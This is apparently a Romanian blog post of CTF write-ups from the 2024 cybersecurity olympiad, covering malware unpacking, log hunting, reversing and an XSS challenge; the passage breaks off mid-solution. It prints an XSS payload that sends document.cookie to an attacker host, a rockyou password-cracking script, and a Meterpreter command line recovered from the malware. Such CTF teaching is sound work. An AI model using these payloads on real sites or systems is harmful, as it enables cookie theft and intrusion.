---
title: '🇷🇴 Rezolvări Olimpiada de Securitate Cibernetică 2024'
Enunt: 'Rezolvări pentru problemele de Jeopardy si Attack/Defense de la Olimpiada de Securitate Cibernetică 2024 / finala ROCSC 2024'
date: 2024-06-02T00:00:00Z
---

In acest blog voi prezenta rezolvarile pentru problemele de Jeopardy si Attack/Defense de la faza nationala a Olimpiadei de Securitate Cibernetica / finala RoCSC 2024. Voi incerca sa prezint atat rezolvarile, cat si metodologia prin care am ajuns la acestea. 

Aceasta a fost ultima mea editie, deci sper ca materialele prezentate sa fie de folos pentru viitorii participanti. Atat pentru OSC/RoCSC, cat si pentru competitiile internationale ([ECSC](https://ecsc.eu/), [ICC](https://ecsc.eu/icc/), etc).

# Cuprins

* [**--- Jeopardy OSC + ROCSC ---**](#jeopardy)
* [volatile-mal (300 pts, 11 solves) - Reverse Engineering](#volatile-mal)
* [difficult-situation (51 pts, 117 solves) - Threat hunting](#difficult-situation)
* [discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response](#discover-the-secret-inside)
* [shift (50 pts, 65 solves) - Reverse Engineering](#shift)
* [richnotes (350 pts, 9 solves) - Web](#richnotes)
* [solve-this (267 pts, 13 solves) - Cryptography](#solve-this)
* [spanzuratoarea (467 pts, 1 solve) - Pwn](#spanzuratoarea)
* [zero-shot (50 pts, 34 solves) - ML/AI](#zero-shot)
* [**--- Jeopardy ROCSC ---**](#jeopardy-rocsc)
* [keylogger (433 pts, 7 solves) - Network](#keylogger)
* [magic (467 pts, 3 solves) - Pwn](#magic)
* [decrypt-this (483 pts, 1 solve) - Cryptography](#decrypt-this)
* [**--- Baraj / Attack & Defense ROCSC ---**](#attack-defense)
* [eeeinvoice - A/D](#eeeinvoice)
* [lazypeoninn - A/D](#lazypeoninn)

<a name="jeopardy"></a>
# Jeopardy

Inainte de a vorbi despre probleme, vreau sa mentionez cateva lucruri despre concursurile CTF de tip Jeopardy. O sa ma axez pe partea practica, deoarece nu as putea acoperi toate aspectele teoretice intr-un singur articol.

In principiu, un concurs de tip Jeopardy este doar un concurs in care participantii trebuie sa rezolve o multime de probleme pregatite de organizatori. Cand spunem ca rezolvam o problema, este suficient sa obtinem un rezultat numit **flag**, care este de obicei un sir de caractere ce are o anumita forma (de exemplu, `CTF{sha256}`). Platformele de concurs iti ofera si feedback in timp real, deci stii daca ai obtinut flag-ul corect sau nu. <br> In plus, la multe concursuri poti vedea si clasamentul in timp real, pentru a stii cum te clasezi fata de alti participanti.

Un lucru fain este ca nu conteaza cum am ajuns la rezultat, ci doar ca l-am obtinut. Ceea ce este destul de diferit fata de alte concursuri sau olimpiade, unde se acorda punctaj si pentru *modalitatea de rezolvare*, sau problemele sunt facute in asa mod incat exista doar un singur mod de rezolvare. **Creativitatea** este importanta, si nu ne putem baza pe invatarea unui algoritm universal pentru a rezolvarea problemelor.

Un alt lucru important este **gestionarea timpului**. Nu exista punctaje partiale, deci chiar daca am fost foarte aproape sa rezolvam o problema, cat timp nu obtinem flag-ul nu o sa primim niciun punct. In principiu, acest lucru se invata doar cu experienta. Dar daca ar fi sa dau un sfat, as spune ca cel mai mult m-a ajutat sa incerc sa lucrez la cat mai multe probleme *in paralel*. Astfel incat daca este o problema pe care stiu sa o rezolv si trebuie doar sa o implementez, pot sa ma gandesc in subconstient la rezolvarea altor probleme.

In multe astfel de concursuri, problemele au **punctaj dinamic**: toate problemele incep cu acelasi numar de puncte, dar punctele acelei probleme scad pe masura ce alti participanti o rezolva. Aici intervine si partea de **strategie** la care trebuie sa ne gandim: problemele grele au mai multe puncte, dar necesita si mai mult timp. Asadar, trebuie sa ne gandim daca vrem sa alocam timp pentru ele sau ne concentram pe problemele mai usoare.

Cele mai intalnite categorii de probleme sunt:
* **Web** - vulnerabilitati de securitate in aplicatii web
* **Reverse Engineering** - dezasamblare, decompilare, analiza de cod si intelegere a unui program fara acces la codul sursa
* **Cryptography** - criptare, decriptare, analiza de cifruri implementate gresit
* **Pwn** - exploatare de vulnerabilitati de securitate in aplicatiile native (de obicei cele scrise in C/C++)
* **Forensics** - analiza de fisiere, trafic de retea, capturi de memorie, etc
* **Misc** - probleme care nu se incadreaza in nicio alta categorie. Nu mereu au treaba cu securitatea, dar necesita cunostinte tehnice

Pentru concursurile individuale, este important sa avem cunostinte generale despre toate aceste categorii. Dar pentru concursurile de echipa, este important sa avem membrii cu expertiza in fiecare domeniu, din cauza punctajului dinamic.

<a name="volatile-mal"></a>
## volatile-mal (300 pts, 11 solves) - Reverse Engineering

Enunt:
```
Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(

Scop: Binarul conține mai multe executabile criptate/encodate. Găsiți ultimul binar, iar flag-ul se va găsi în User-Agent.

Advertisment: Tratează fișierul ca și un malware. Nu rula executabilul direct pe computerul tau, ci creează o mașină virtuală pentru a rezolva acest exercițiu! AUTORII NU SUNT RESPONSABILI ÎN NICI UN CAZ PENTRU NICIO SOLICITATIE, DAUNE SAU ALTE RASPUNDERI.

Disclaimer: Treat the file as a malware. Do not run the binary directly on your computer, instead create a virtual machine to solve this challenge! IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY.
```

Inainte sa incepem a rezolva orice problema, este important sa citim cu atentie enuntul, titlul si categoria pentru a obtine indicii care ne pot ajuta sa rezolvam problema. In cazul de fata, reverse engineering + malware ne indica ca va trebui sa analizam (cel mai probabil) un binar executabil.

Primim un binar numit `poly`. Este bine totusi ca mereu sa verificam tipul fisierului primit cu comanda `file`:
```
$ file poly
poly: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce1a857a7b95699164ae7e5085392079ff5006c3, for GNU/Linux 3.2.0, stripped
```

Deci este un binar executabil de Linux, arhitectura x86 pe 64 de biti. Urmatorul pas este sa folosim un tool de dezasamblare pentru a analiza codul executabil. Personal, recomand folosirea `IDA` fata de `Ghidra` sau `Binary Ninja`, deoarece ne va face viata mai usoara prin calitatea decompilarii.

`IDA` este gratis pentru x86 pe 32/64 de biti, si foloseste un decompilator in cloud. Pentru alte arhitecturi putem folosi `Ghidra`, care este un tool gratis si open-source, oferit de NSA.

Bun, deschidem binarul in IDA si mergem catre functia main. Apasam F5 si vedem codul decompilat:

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  void *v3; // r12
  __int64 v4; // rbp
  char *envp; // [rsp+8h] [rbp-60h] BYREF
  char *argv[4]; // [rsp+10h] [rbp-58h] BYREF
  char v8[24]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  v3 = (void *)sub_1390(&unk_4020);
  v4 = (unsigned int)memfd_create("sysdaemon", 0LL);
  __sprintf_chk(v8, 1LL, 20LL, "%d", v4);
  argv[1] = v8;
  argv[0] = "[kwork/99:1]";
  argv[2] = 0LL;
  envp = 0LL;
  sub_1410(v4, v3);
  fexecve(v4, argv, &envp);
  if ( v9 != __readfsqword(0x28u) )
    start();
  return 0LL;
}
```

Decompilarea arata bine, iar deoarece binarul este `dynamically linked`, avem si functiile din libc cu numele lor, deci ne scuteste de multa munca.

Ce face codul dat? Cel mai usor mi se pare sa analizez programul ignorand functiile de tip `sub_0000`, pentru a avea o privire de ansamblu.

Vedem ca prima functie apelata este `memfd_create`, care conform manualului:
```
memfd_create() creates an anonymous file and returns a file
      descriptor that refers to it.  The file behaves like a regular
      file, and so can be modified, truncated, memory-mapped, and so
      on.  However, unlike a regular file, it lives in RAM and has a
      volatile backing storage.  Once all references to the file are
      dropped, it is automatically released.
```
Pe scurt, creaza un fisier in memorie. Bun, alt indiciu, deoarece este o tactica comuna pentru malware sa aiba mai multe stagii, iar aceste stagii sa fie criptate, si decriptate in timpul executiei.

In rest, functia main seteaza parametrii si apeleaza `fexecve`, care este un fel de `execve` (executa un alt program), dar primeste un file descriptor in loc de un path catre un fisier. Deci, binarul va executa un alt binar, care va fi creat in memorie.

Asadar, deja avem niste indicii despre ce ar putea face functiile `sub_1390` si `sub_1410`. Si le putem privi si in IDA:
```c
unsigned __int8 *__fastcall sub_1390(void *src, int a2)
{
  void *v2; // rax
  unsigned __int8 *v3; // rax
  unsigned __int8 *v4; // r8
  unsigned __int8 *v5; // rdx
  unsigned __int8 *v6; // rsi
  __int64 v7; // rax

  v2 = malloc(a2);
  v3 = (unsigned __int8 *)memcpy(v2, src, a2);
  v4 = v3;
  if ( a2 > 0 )
  {
    v5 = v3;
    v6 = &v3[a2];
    do
    {
      v7 = *v5++;
      *(v5 - 1) = byte_160160[byte_160160[(unsigned __int8)__ROL1__(byte_160260[v7], 4)]];
    }
    while ( v6 != v5 );
  }
  return v4;
}

void __fastcall sub_1410(int fd, char *ptr, __int64 a3)
{
  __int64 v4; // rbx
  size_t v5; // rdx
  ssize_t v6; // rbp

  v4 = 0LL;
  do
  {
    while ( 1 )
    {
      v5 = a3 - v4;
      if ( a3 - v4 > 2147479552 )
        v5 = 2147479552LL;
      v6 = write(fd, &ptr[v4], v5);
      if ( v6 == -1 && *__errno_location() == 4 )
        break;
      v4 += v6;
      if ( v4 == a3 )
        goto LABEL_8;
    }
  }
  while ( v4 != a3 );
LABEL_8:
  free(ptr);
}
```

Ok, in acest punct avem 2 optiuni: Rescriem implementarea celor 2 functii intr-un program al nostru de Python/C (static analysis). Sau, mai rapid, putem folosi o metoda de analiza dinamica precum un debugger.

Eu totusi am ales alta cale. Revenind la programul nostru `poly` si faptul ca este `dynamically linked`, asta inseamna ca functia `fexecve` nu exista de fapt in binar, ci este o functie din libc care va fi incarcata in timpul rularii programului de catre loader. <br> In Linux, ne putem folosi de `LD_PRELOAD` pentru a inlocui functia `fexecve` cu una proprie, care sa salveze rezultatul din acel file descriptor intr-un fisier.

```c
// Cod generat de ChatGPT
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>

int fexecve(int fd, char *const argv[], char *const envp[]) {
    printf("fexecve called\n");

    // Dump the contents of the file descriptor to "part2"
    char buffer[4096];
    ssize_t bytes;
    int part2_fd = open("part2", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (part2_fd == -1) {
        perror("open part2");
        return -1;
    }

    // Move to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    // Read from fd and write to part2
    while ((bytes = read(fd, buffer, sizeof(buffer))) > 0) {
        if (write(part2_fd, buffer, bytes) != bytes) {
            perror("write to part2");
            close(part2_fd);
            return -1;
        }
    }
    close(part2_fd);

    // Move back to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    printf("Dumped the contents of the file descriptor to part2\n");
    printf("Exiting...\n");
    exit(0);
}
```

Trebuie doar sa compilam acest cod ca un shared object (biblioteca) prin comanda:
```
$ gcc -shared -fPIC -o libintercept.so intercept.c -ldl
```

Si sa executam programul `poly` cu `LD_PRELOAD` setat la calea catre biblioteca noastra:
```
$ LD_PRELOAD=./libintercept.so ./poly
fexecve called
Dumped the contents of the file descriptor to part2
Exiting...
```

Desigur, intr-un caz real, nu as recomanda sa rulam un binar necunoscut pe calculatorul nostru. Mai ales pentru ca nu am analizat programul complet, si este posibil ca acesta sa faca si alte lucruri inaintea functiei `main`. Dar intr-un concurs, orice metoda care ne salveaza timpul este binevenita.

Okay, am obtinut `part2`, rulam din nou `file` sa vedem ce tip de fisier este:
```
$ file part2
part2: Python script, ASCII text executable, with very long lines (64966)
```

`file` ne spune ca este un fisier de tip Python, deci putem folosi un editor de text (VSCode/vim) pentru a-l deschide si a vedea continutul.

Structura programului este urmatoarea:
```python
#!/usr/bin/python3
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import hashlib
import crypt
import setproctitle
from hmac import compare_digest
import os
import base64
import sys
setproctitle.setproctitle('[nfsd]')
os.close(int(sys.argv[1],10))
salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
mypass = input()
mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
sys.exit() if not compare_digest(mycry,crypt.crypt(mypass,mycry)) else None
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)
enc_msg = base64.b64decode(b'3Y0tpXf93jTzCXI/I3GQqyXX6MCWIw9SgdGj7F5Mp06SrKBNSY9tcGybNpZTUjUYHE7FWnXAVc2mk5fRwblQcfKZ05tLkXpUD') # un base64 foarte lung
fd=os.memfd_create('[kwork/99:1]',0)
fn='/proc/self/fd/'+str(fd)
with open(fn,'wb') as g: g.write(pay)
os.execl(fn,fn)
```

Programul cere o parola, o verifica folosind `crypt.crypt` (functie de hashing), si daca parola este corecta, decripteaza stagiul urmator folosind `AES` cu o cheie derivata din parola. Deci, trebuie sa gasim parola pentru a putea avansa cu rezolvarea problemei.

O sa revin la ce am spus la inceput, anume ca enuntul problemei deseori ascunde indicii importante. In cazul de fata, `Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(` din enunt este un indiciu ca parola este se regaseste in colectia de parole `rockyou.txt`. (aceasta este doar o ipoteza, nu inseamna *neaparat* ca parola se va regasi in aceasta colectie, si uneori se intampla sa credem ca parti din enunt sunt indicii cand de fapt nu sunt, dar este totusi o ipoteza valida si trebuie sa o verificam).

Avem astfel primul topologie de problema care se regaseste in mai multe categorii, si anume *bruteforce*. In acest caz, avem 2 optiuni: folosim un tool specializat pentru asta (de ex hashcat), sau ne scriem noi propriul script de bruteforce. In timpul concursului am ales sa scriu un script de bruteforce in Python, care sa ruleze pe toate core-urile folosind `multiprocessing`. (in plus, consider ca este un skill important de a sti sa scrii propriile scripturi de bruteforce, deoarece in multe cazuri nu putem folosi tool-uri specializate).

```python
import crypt
import multiprocessing
from multiprocessing import Pool

mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
i = 0

# Read passwords from rockyou.txt
passwords = []
for password in open('rockyou.txt', 'rb').readlines():
    try:
        passwords.append(password.strip().decode())
    except UnicodeDecodeError:
        pass

print(f"Total passwords loaded: {len(passwords)}")

# Define the worker function
def check_password(password):
    if crypt.crypt(password, mycry) == mycry:
        print(f"Password found: {password}")
        return True
    return False

def main():
    with Pool(32) as p:
        result = p.map(check_password, passwords)
        if any(result):
            print("Password cracked successfully.")
        else:
            print("Password not found.")

if __name__ == "__main__":
    main()
```

Lasam script-ul sa ruleze, si in acest timp ne putem concentra pe alte probleme (nu stam sa pierdem timp uitandu-ne la terminal, nu o sa-l faca sa ruleze mai repede). 

Script-ul s-a terminat si am gasit parola `acest000id111este222securizat333`. Stim ca parola este folosita pentru a decripta acel base64 prin AES, deci putem scrie un script de Python care sa faca asta (practic ce am gasit in part2, dar fara sa si executam binarul):

```python
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

x = open('b64','r').read()

import base64

enc_msg = base64.b64decode(x)

mypass = 'acest000id111este222securizat333'

salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)

pay = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc_msg), AES.block_size)

open('part3', 'wb').write(pay)
```

Desigur, rulam comanda `file` pentru a vedea ce tip de fisier este `part3`:
```bash
$ file part3
part3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
```

Si avem iar de a face cu un binar. Daca il deschidem in IDA, o sa vedem ca este un binar complex cu mii de functii. Asadar, in cazul de fata, cel mai simplu este sa incercam sa vedem daca putem gasi flag-ul cu `strings`, pentru a nu pierde timp analizand codul.

```bash
$ strings part3 | grep CTF
mettle -U "TYtji7XTYf+edph0+DMxkQ==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "https://127.0.0.1:12312/7soSKNhkUQW2o7Ch0OYZRAlA7q-vi16LBcoLNylkFX0YrS3mXA6__qNlVSC|--ua 'Mozilla/5.0 CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}'" -d "0" -o "" -b "0"
```

Si da, am obtinut flag-ul, fara sa mai stam sa analizam `part3`. Flag-ul a fost in User Agent, asa cum a fost precizat in enunt.

**CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}**

<a name="difficult-situation"></a>
## difficult-situation (51 pts, 117 solves) - Threat hunting

Enunt:
```
Investighează alertele de pe acest sistem compromis folosind Elasticsearch și ajută-ne să obținem răspunsurile necesare pentru a rezolva acest incident de securitate.

Pentru a obține acces la datele colectate, selectează Kibana -: Discover -: și alege 2018 ca și an de start pentru setarea timeframe-ului.
```

Problema de forensics. Avem la dispozitie o instanta de Kibana, unde putem cauta in loguri. In general, Kibana si Elasticsearch sunt folosite impreuna cu Logstash pentru a forma ELK Stack, care poate fi folosit ca si un SIEM (Security Information and Event Management). Un SIEM este un sistem care colecteaza date de la diferite surse si le transforma intr-un format pe care il putem analiza prin query-uri. Cu aceste query-uri putem sa cream dashboard-uri, alerte, si sa investigam incidente de securitate. Cel mai important lucru atunci cand lucram cu un SIEM este sa selectam intervalul de timp corect, asa cum este mentionat si in enunt.

Avem 3 intrebari la care trebuie sa raspundem. 

1. Q1. Identifică IP-ul mașinii compromise. 
* Din dashboard, putem filtra prin interfata grafica pentru evenimente care contin IP sursa / desinatie. Pentru ca este vorba despre o masina compromisa, putem presupune ca este vorba despre un eveniment ce contine un IP privat (10.x.x.x, 192.168.x.x, 172.16.x.x). Intr-un eveniment gasim IP-ul **10.1.30.102** care este si primul flag.
2. Q2. Unele evenimente din Kibana au status code 200. Identifică IP-ul sursă a acestor evenimente.
* Ne folosim iar de interfata grafica din Kibana si selectam doar evenimentele care au status code 200. Deoarece nu sunt chiar atat de multe evenimente in log-uri si nu avem o limita de incercari, putem sa incercam IP-urile sursa ca flag, pana gasim IP-ul **198.105.244.64** corect
3. Q3. Identifică URL path-ul folosit ăn atac. 
* Revenim iar la interfata grafica si filtram evenimentele care contin path in URL. Vedem ca sunt foarte putine evenimente rezultate, si primul rezultat este chiar flag-ul: **/ceva/**

<a name="discover-the-secret-inside"></a>
## discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response

Enunt:
```
Una din stațiile de lucru din infrastructura noastră a fost compromisă. Te rog să ne ajuți cu câteva informații.
```

Q1. Identifică ce soluție a încercat să descarce de pe Internet utilizatorul calculatorului compromis după ce acesta a semnalat un comportament suspicios a stației de lucru. (Points: 13)
<br> Format: term1

**chkrootkit**

Q2. Identifică soluția ce permite crearea unui thread-feed unde se pot urmări amenințările cbernetice, ce este instalată pe sistemul compromis (Points: 13)
<br> Format: acronimul numelui întreg a soluției folosite

**misp**

Q3. Care este ultima comandă executată de atacator pe sistem? (Points: 13)
<br> Format: term1 term2 term3

**sudo groupadd admin**

Q4. Identifică IP-ul stației de lucru compromise. (Points: 13)
<br> Format: IPv4 adresă standard

**10.0.8.25**

<a name="shift"></a>
## shift (50 pts, 65 solves) - Reverse Engineering

Enunt:
```
Se dă un binar în C care execută un algoritm în spate.

Să se identifice algoritmul din spate folosind tehnici de Reverse Engineering.

Flag format: CTF{sha256}
```

O problema introductiva in Reverse Engineering. Ca intotdeauna, incepem prin a rula `file` pe fisier:
```
$ file shift
shift: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eca2a55a7350099798618cf194225d617659da21, for GNU/Linux 3.2.0, stripped
```

Deci un binar de Linux, arhitetura x86 pe 64 de biti. Dynamically linked, si fara simboluri (stripped). Deschidem binarul in IDA si vedem codul decompilat:

```c
__int64 __fastcall main(__int64 argc, char **argv, char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-50h] BYREF
  char v5[24]; // [rsp+30h] [rbp-30h] BYREF
  __int16 v6; // [rsp+48h] [rbp-18h]
  unsigned __int64 v7; // [rsp+58h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  sub_11A9();
  if ( (_DWORD)argc == 2 )
  {
    strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
    v4[25] = 0;
    *(_QWORD *)v5 = 0x908070605040302LL;
    *(_QWORD *)&v5[8] = 0x11100F0E0D0C0B0ALL;
    *(_QWORD *)&v5[16] = 0x1918171615141312LL;
    v6 = 0;
    if ( strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, v5) )
      return 0LL;
    else
      return 0LL;
  }
  else
  {
    puts("[+] We need one more argument");
    return 0xFFFFFFFFLL;
  }
}
```

Am modificat semnatura functiei main, astfel incat sa stim unde avem de-a face cu argc si argv. Vedem ca programul verifica sa fie rulat cu 2 argumente. Si chiar daca ambele cazuri din if returneaza 0, putem sa presupunem ca trebuie sa satisfacem conditia `strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, plus_key)`.

Cand rezolvam probleme de rev, este bine sa notam orice pare suspect. In cazul de fata, avem acest string de 25 de caractere in v4: `strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");`. Iar al 26-lea caracter este setat manual sa fie NULL (adica 0). Cealalta variabila suspecta este `v5`, care contine 3 valori de 8 bytes. Aceasta este doar o optimizare facuta de compilator. `v5` este o cheie care este folosita in functia `sub_124A`. Dar compilatorul a decis sa mute valorile cheii cate 8 bytes pentru a fi mai eficient. Cu toate acestea, pattern-ul este destul de evident cand privim in hex, pentru ca fiecare byte este reprezentat de 2 caractere hex.

Okay, acum sa vedem ce face functia `sub_124A`:
```c
__int64 __fastcall sub_124A(char *a1, char *a2, char *a3)
{
  int v4; // [rsp+24h] [rbp-4h]

  v4 = 0;
  do
  {
    if ( a2[v4] + a3[v4] != a1[v4] )
      return 0LL;
    ++v4;
  }
  while ( a2[v4] && a1[v4] );
  return 1LL;
}
```

Folosim hotkey-ul `N` in IDA si redenumim asa: a1 in argv1, a2 in str (v4 din main) si a3 (v5 din main) in key, v4 in i. Astfel, codul devine mult mai usor de citit:
```c
__int64 __fastcall sub_124A(char *argv1, char *str, char *key)
{
  int i; // [rsp+24h] [rbp-4h]

  i = 0;
  do
  {
    if ( str[i] + key[i] != argv1[i] )
      return 0LL;
    ++i;
  }
  while ( str[i] && argv1[i] );
  return 1LL;
}
```

Deci trebuie doar sa adunam key cu str si vom obtine parola. Pentru a nu ne complica cu transcrisul lui v5 in Python, e mai simplu sa scriem un program in C care ne afiseaza argumentul corect:
```c
#include <stdio.h>
#include <string.h>

int main() {
  char v4[32];
  strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
  v4[25] = 0;
  char plus_key[24];

  *(long long int *)plus_key = 0x908070605040302LL;
  *(long long int *)&plus_key[8] = 0x11100F0E0D0C0B0ALL;
  *(long long int *)&plus_key[16] = 0x1918171615141312LL;

  for (int i=0;i<24;i++) {
    v4[i] = v4[i] + plus_key[i];
  }
  printf("%s\n", v4);

}
```

Compilam si rulam programul:
```
$ gcc solve.c -o solve
$ ./solve
Shift_Stuff_all_The_time
```

Ne conectam cu netcat la server si introducem parola:
```
$ nc ip port
```

Si primim flag-ul **CTF{f157c4bb8fabb5788ec40e544d29513c3f5166499231efe94db5c4f4dc245c8c}**

<a name="richnotes"></a>
## richnotes (350 pts, 9 solves) - Web

Enunt:
```
Ceva este suspicios cu această aplicație de luat notițe.

Flag format: CTF{sha256}
```

Primim un link catre o aplicatie web, precum si codul sursa pentru aceasta aplicatie. Pentru aplicatiile web, este important sa identificam structura proiectului. In cazul de fata:
```
.
├── Dockerfile
├── docker-compose.yml
├── package-lock.json
├── package.json
├── src
│   ├── api
│   │   └── v1
│   │       └── note
│   │           ├── index.ts
│   │           └── schema.ts
│   ├── index.ts
│   ├── types
│   │   └── env.d.ts
│   └── zexpress
│       ├── routing
│       │   └── index.ts
│       └── validation
│           └── index.ts
├── static
│   ├── index.html
│   └── note.html
└── tsconfig.json
```

Avem o aplicatie scrisa in node.js si foloseste TypeScript ca limbaj de programre. In `src` putem identifica `api/v1/note` care pare sa fie o **ruta**. O ruta este doar un mod de a apela codul scris in *backend* folosind protocolul HTTP (de exemplu printr-un request de tipul `GET /api/v1/note HTTP/1.1`).

Este important sa identificam rutele, doarece ele reprezinta punctele de intrare pe care la avem pentru a putea gasi vulnerabilitati in aplicatiile web. `schema.ts` in general o sa contina structurile de date folosite, deci nu o sa ne intereseze la inceput. Hai sa aruncam o privire la `index.ts`

```ts
import { validateProperty } from 'src/zexpress/validation'
import { PostNote, GetNote } from './schema'
import { ChainableRouter } from 'src/zexpress/routing'
import crypto from 'crypto'
import DOMPurify from 'isomorphic-dompurify'
import * as puppeteer from 'puppeteer'

const chainableRouter = new ChainableRouter()
const noteMap: Record<string, Buffer> = {}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

const spawnBot = async (url: string) => {
  let browser: puppeteer.Browser | null = null
  try {
    browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome-stable',
      headless: 'shell',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--disable-dev-shm-usage',
      ],
    })
    const page = await browser.newPage()

    await page.setCookie({
      name: 'FLAG',
      value: process.env.FLAG || '',
      domain: new URL(url).hostname,
      httpOnly: false,
      secure: false,
      sameSite: 'Lax',
    })
    await page.goto(url, { waitUntil: 'networkidle2' })
    await sleep(parseInt(process.env.TIMEOUT || '10000'))
  } catch (error) {
    console.error('Error encountered:', error)
  } finally {
    if (browser) {
      await browser.close()
    }
  }
}

chainableRouter
  .pipe(validateProperty(PostNote, 'body'))
  .post('/', async (req, res) => {
    const uuid = crypto.randomUUID()
    noteMap[uuid] = Buffer.from(DOMPurify.sanitize(req.content))
    return res.status(200).send({ id: uuid })
  })

chainableRouter
  .pipe(validateProperty(GetNote, 'query'))
  .get('/', async (req, res) => {
    if (Object.prototype.hasOwnProperty.call(noteMap, req.id)) {
      return res
        .status(200)
        .send({ id: req.id, content: noteMap[req.id].toString('ascii') })
    }

    return res.status(404).send({ message: 'Note does not exist' })
  })

chainableRouter
  .pipe(validateProperty(GetNote, 'body'))
  .post('/report', async (req, res) => {
    if (Object.prototype.hasOwnProperty.call(noteMap, req.id)) {
      spawnBot(`${process.env.BASE_URL}/note/${req.id}`)
      return res.status(200).send({
        message: 'Your report has been received and will be reviewed shortly',
      })
    }

    return res.status(404).send({ message: 'Note does not exist' })
  })
```

Observam cateva lucruri interesante:
* Exista o functie numita `spawnBot` care porneste un proces de tip `puppeteer`, practic o instanta de browser, Google Chrome in acest caz, care poate fi controlata prin cod. Flag-ul se afla in cookie, deci stim ca avem de-a face cu o problema de tip *XSS*
* Avem 3 rute la dispozitie: 
    * `GET pe /api/v1/note` cu input-ul `?id=` in query string
    * `POST pe /api/v1/note` cu input-ul `{"content":"text pe care il controlam"}` in body, si content-type application/json
    * `GET pe /api/v1/note` cu input-ul `?id=`, pentru a trimite acel id catre admin, pentru a verifica continutul. Observam ca admin-ul se va conecta pe `/note/<note_id>`, in loc de `/api/v1/note`

Cum am stiut exact ce input putem aplica rutelor? Ei bine am mentionat `schema.ts`, in acest caz avem `GetNote` si `PostNote` cu urmatoarele definitii:
```ts
import { z } from 'zod'

export const PostNote = z.object({
  content: z.string().max(4096),
})

export const GetNote = z.object({
  id: z.string().uuid(),
})
```

Unde `zod` este folosit pentru validare. Pentru request-urile GET, parametrii de obicei se trimit in **query string**. Iar pentru POST, de obicei in **body**, dar pot fi trimisi si in **query string** uneori, depinde de server.

Dar cum arata aceste note? Daca urmarim `src/index.ts`:
```ts
app.get('/note/:id', (_, res) => {
  res.sendFile(path.join(process.cwd(), 'static/note.html'))
})
```
Unde id-ul notei este preluat direct din path (acesta este un alt mod in care se poate trimite informatie prin request-uri HTTP).

Okay, stim ca vrem sa obtinem XSS, asa ca ne uitam in `note.html`:
```html
  <script>
    window.addEventListener('load', () => {
      const noteId = window.location.pathname.split('/').pop()

      document.querySelector('#reportNoteUrl').addEventListener('click', () => {
        fetch('/api/v1/note/report', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: window.noteId }),
        })
          .then((result) => result.json())
          .then((result) => {
            if (Object.prototype.hasOwnProperty.call(result, 'message')) {
              document.querySelector('#reportMessage').innerHTML =
                result.message
            } else {
              document.querySelector('#reportMessage').innerHTML =
                'Failed to report note'
            }
          })
      })

      fetch(`/api/v1/note/?id=${noteId}`)
        .then((result) => result.json())
        .then((result) => {
          const node = document.querySelector('#content')
          node.innerHTML = result.content
          window.noteId = noteId
        })
    })
  </script>
```

Nu este foarte mult cod. Avem un buton pentru a raporta nota, si un `fetch` facut atunci cand codul html s-a incarcat. Importanta este aceasta linie:
```js
node.innerHTML = result.content
```
Continutul notei o sa fie introdus direct ca html in pagina. Deci daca avem o nota cu continut html de genul: 
```
<img src=x onerror=fetch("//attacker.requestrepo.com/",{method:"POST",body:document.cookie})/>
```
putem obtine executie de cod in JavaScript. Deoarece resursa `x` nu exista, se va apela handler-ul `onerror`, care va *exfiltra* flag-ul catre requestrepo (sau alt server la care avem acces la log-uri).

De ce nu putem introduce direct acest payload in continutul notei? Ei bine, cand nota este salvata pe server, se aplica functia de sanitizare de la DOMPurify:
```
noteMap[uuid] = Buffer.from(DOMPurify.sanitize(req.content))
```

DOMPurify este o biblioteca folosita de milioane de site-uri, deci nu trebuie sa pierdem timpul incercand sa gasim un bypass.

Solutia este subtila, dar se afla in aceasta linie de cod:
```js
.send({ id: req.id, content: noteMap[req.id].toString('ascii') })
```

